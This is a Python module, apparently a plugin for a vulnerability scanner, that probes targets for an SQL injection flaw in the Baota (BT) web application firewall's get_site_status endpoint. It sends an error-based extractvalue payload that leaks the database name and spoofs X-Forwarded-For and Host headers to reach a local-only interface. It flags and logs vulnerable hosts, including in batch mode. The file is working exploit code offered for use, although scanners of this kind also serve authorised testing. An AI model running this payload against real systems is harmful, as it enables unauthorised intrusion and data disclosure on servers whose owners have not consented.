#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from rich.prompt import Prompt
from libs.output import OutPutFile
urllib3.disable_warnings()

class BTWaf_Sql_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-'"
            headers = {
                "X-Forwarded-For": "127.0.0.1",
                'Host': '127.0.0.251',
            }
            req = requests.get(url,headers=headers,proxies=self.proxy,verify=self.ssl)
            if "XPATH" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("BT", '目标存在宝塔SQL漏洞')
                    OutPrintInfo("BT", url)
                    OutPrintInfo("BT", f"响应:\n{req.text.strip()}")
                else:
                    OutPrintInfoSuc("BT", f'目标存在宝塔SQL漏洞: {url}')
                    OutPutFile("bt_sql.txt",f'目标存在宝塔SQL漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("BT", f'目标 {input_url} 不存在宝塔SQL漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("BT",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("BT", '开始检测宝塔SQL漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("BT", '宝塔SQL漏洞检测结束')

